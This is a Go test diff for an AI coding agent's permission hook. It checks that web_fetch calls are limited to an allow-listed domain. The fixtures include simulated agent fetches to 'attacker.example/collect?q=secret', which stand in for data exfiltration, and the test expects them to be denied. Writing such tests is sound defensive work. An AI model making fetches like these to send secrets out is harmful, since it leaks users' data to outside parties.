@@ -392,6 +392,57 @@ func TestPolicyEnforcesTheBashAllowList(t *testing.T) {
 	}
 }
 
+// TestFetchAllowListReachesTheHook: qwen's web_fetch is mediated by the
+// same PreToolUse hook every other tool goes through, so permissions.fetch
+// decides it without the adapter needing a rule of its own. This is the
+// verification that the mapping (web_fetch -> WebFetch) still lands on
+// decideFetch rather than on an always-allow.
+func TestFetchAllowListReachesTheHook(t *testing.T) {
+	script := writeScript(t,
+		`{"type":"system","subtype":"init","session_id":"f1"}`,
+		`{"$hookTool":"web_fetch","$hookInput":{"url":"https://docs.example.com/guide"}}`,
+		`{"$hookTool":"web_fetch","$hookInput":{"url":"https://attacker.example/collect?q=secret"}}`,
+		`{"$hookTool":"web_fetch","$hookInput":{"prompt":"read https://attacker.example/x"}}`,
+		`{"$hookTool":"web_search","$hookInput":{"query":"how to fix it"}}`,
+		`{"type":"result","subtype":"success","is_error":false,"num_turns":1,"session_id":"f1","result":"done","usage":{"input_tokens":1,"output_tokens":1}}`,
+	)
+	spec := fakeSpec(t, script)
+	spec.Policy.FetchAllow = []string{"docs.example.com"}
+	s, err := New().Start(context.Background(), spec)
+	if err != nil {
+		t.Fatal(err)
+	}
+	events, res := drain(t, s)
+
+	want := []struct {
+		tool     string
+		decision string
+	}{
+		{"web_fetch", "allow"},
+		{"web_fetch", "deny"},
+		{"web_fetch", "deny"},
+		// web_search carries a query and no destination, so it is not
+		// the allow-list's business; see docs/config.md on what that
+		// leaves open.
+		{"web_search", "allow"},
+	}
+	perms := kinds(events, provider.EvPermission)
+	if len(perms) != len(want) {
+		t.Fatalf("permission events %d, want %d: %+v", len(perms), len(want), perms)
+	}
+	for i, w := range want {
+		if perms[i].Tool != w.tool || perms[i].Decision != w.decision {
+			t.Errorf("call %d: got %s=%s, want %s=%s", i, perms[i].Tool, perms[i].Decision, w.tool, w.decision)
+		}
+	}
+	if !strings.Contains(perms[1].Text, "permissions.fetch") {
+		t.Errorf("the refusal does not name the setting: %q", perms[1].Text)
+	}
+	if res.ExitErr != nil {
+		t.Fatalf("exit err %v", res.ExitErr)
+	}
+}
+
 // TestUnparseableHookRequestIsDenied is the fail-closed half of the
 // mediator: Qwen Code is blocked waiting for an answer, so a payload that
 // cannot be read still gets one, and it is a refusal.
